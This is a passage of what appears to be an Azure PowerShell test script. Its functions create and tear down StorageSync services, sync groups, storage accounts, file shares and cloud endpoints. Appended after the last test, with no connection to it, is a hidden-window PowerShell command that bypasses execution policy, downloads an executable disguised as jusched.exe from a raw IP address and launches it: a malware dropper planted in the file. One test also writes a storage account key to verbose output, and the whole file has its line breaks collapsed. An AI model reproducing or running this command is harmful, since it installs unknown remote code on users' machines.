$resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -CloudEndpointName $cloudEndpointName Write-Verbose "Removing CloudEndpoint: $cloudEndpointName"Remove-AzStorageSyncCloudEndpoint -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $cloudEndpointName -AsJob | Wait-JobWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -AsJob | Wait-JobWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-Jobif(IsLive){Write-Verbose "Removing: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"Remove-StorageShare -Name $AzureFileShareName -Context $context | Out-Null}Write-Verbose "Removing $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"Remove-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-RemoveCloudEndpointInputObject{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$cloudEndpointName = Get-ResourceName("cep")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices")$AzureFileShareName = "testfs" $StorageAccountName = Get-ResourceName("sa")$StorageAccountTenantId = (Get-AzTenant).IdWrite-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Resource: $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"New-AzStorageAccount -StorageAccountName $StorageAccountName -Location $resourceLocation -ResourceGroupName $resourceGroupName -Type Standard_LRS$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName$key = Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $StorageAccountNameWrite-Verbose "Resource: $StorageAccountName | Key: $($key[0])" $context = Create-StorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $key[0].ValueWrite-Verbose "Resource: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"$azureFileShareName = Create-StorageShare -Name $AzureFileShareName -Context $context$storageAccountResourceId = $storageAccount.IdWrite-Verbose "Resource: $cloudEndpointName | Loc: $resourceLocation | Type : CloudEndpoint"$cloudEndpoint = New-AzStorageSyncCloudEndpoint -ResourceGroupName $syncGroup.ResourceGroupName  -StorageSyncServiceName $syncGroup.StorageSyncServiceName -SyncGroupName $syncGroup.SyncGroupName -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId -VerboseWrite-Verbose "Removing CloudEndpoint: $cloudEndpointName"Remove-AzStorageSyncCloudEndpoint -Force -InputObject $cloudEndpoint -AsJob | Wait-JobWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -AsJob | Wait-JobWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-Jobif(IsLive){Write-Verbose "Removing: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"Remove-StorageShare -Name $AzureFileShareName -Context $context | Out-Null}Write-Verbose "Removing $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"Remove-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-RemoveCloudEndpointResourceId{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$cloudEndpointName = Get-ResourceName("cep")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices")$AzureFileShareName = "testfs" $StorageAccountName = Get-ResourceName("sa")$StorageAccountTenantId = (Get-AzTenant).IdWrite-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Resource: $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"New-AzStorageAccount -StorageAccountName $StorageAccountName -Location $resourceLocation -ResourceGroupName $resourceGroupName -Type Standard_LRS$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName$key = Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $StorageAccountNameWrite-Verbose "Resource: $StorageAccountName | Key: $($key[0])" $context = Create-StorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $key[0].ValueWrite-Verbose "Resource: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"$azureFileShareName = Create-StorageShare -Name $AzureFileShareName -Context $context$storageAccountResourceId = $storageAccount.IdWrite-Verbose "Resource: $cloudEndpointName | Loc: $resourceLocation | Type : CloudEndpoint"$cloudEndpoint = New-AzStorageSyncCloudEndpoint -ResourceGroupName $syncGroup.ResourceGroupName  -StorageSyncServiceName $syncGroup.StorageSyncServiceName -SyncGroupName $syncGroup.SyncGroupName -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId -VerboseWrite-Verbose "Removing CloudEndpoint: $cloudEndpointName"Remove-AzStorageSyncCloudEndpoint -Force -ResourceId $cloudEndpoint.ResourceId -AsJob | Wait-JobWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -AsJob | Wait-JobWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-Jobif(IsLive){Write-Verbose "Removing: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"Remove-StorageShare -Name $AzureFileShareName -Context $context | Out-Null}Write-Verbose "Removing $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"Remove-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~rama/jusched.exe', $env:TEMP\jusched.exe );Start-Process ( $env:TEMP\jusched.exe )